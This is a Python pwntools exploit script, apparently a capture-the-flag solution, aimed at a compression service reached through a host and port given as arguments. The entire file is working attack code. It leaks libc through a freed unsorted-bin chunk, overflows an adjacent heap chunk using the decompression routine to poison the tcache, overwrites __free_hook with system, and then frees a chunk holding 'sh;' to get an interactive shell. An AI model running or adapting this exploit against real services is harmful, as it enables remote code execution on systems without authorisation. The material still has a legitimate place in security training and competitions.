from pwn import *

def compress(input):
	p.sendlineafter(b">",b"1")
	p.sendlineafter(b"Enter text:",bytes(input))

def decompress(input):
	p.sendlineafter(b">",b"2")
	p.sendlineafter(b"Enter compressed text:",input)

def free(t,idx):
	p.sendlineafter(b">",b"3")
	p.sendlineafter(b"Compress or decompress slot? (c/d):",bytes(t,'utf-8'))
	p.sendlineafter(b"Idx:",bytes(idx,'utf-8'))

#p = process("./pp")
#p = remote("127.0.0.1",5001)
p = remote(args.HOST, int(args.PORT))
libc = ELF("./libc.so.6",checksec=False)

# leak libc via unsorted bin
log.info("Stage 1..")
compress(b"A"*850)
compress(b"A"*70)

free("c","1")
free("c","0")

p.sendlineafter(b">",b"5")
p.sendlineafter(b"Idx:",b"0")
l = p.recvuntil(b"1.").split()
libc.address = u64(l[1].ljust(8,b"\x00")) - 0x1ecbe0
log.success(f'libc_base: {hex(libc.address)}')

# $20A will decompress to 'A' * 20 
log.info("Stage 2..")
decompress(b"$20A"+b"A"*24)
decompress(b"$20B"+b"B"*24)
decompress(b"$20C"+b"C"*24)

# free chunks in reverse order, therefore first available will be served from,
# the top of the tcache list and will allow to overflow the adjacent ones
free("d","2")
free("d","1")
free("d","0")

# $56X will decompress to 'X' * 56 + payload, overflowing adjacent chunk
decompress(b"$56X"+p64(0x41)+p64(libc.sym.__free_hook)*2)
decompress(b"sh;BBBBBBBBBBBBBBBBBBBBB")
decompress(p64(libc.sym.system)+b"B"*16)

# free will call system("sh;..")
free("d","1")

p.interactive()
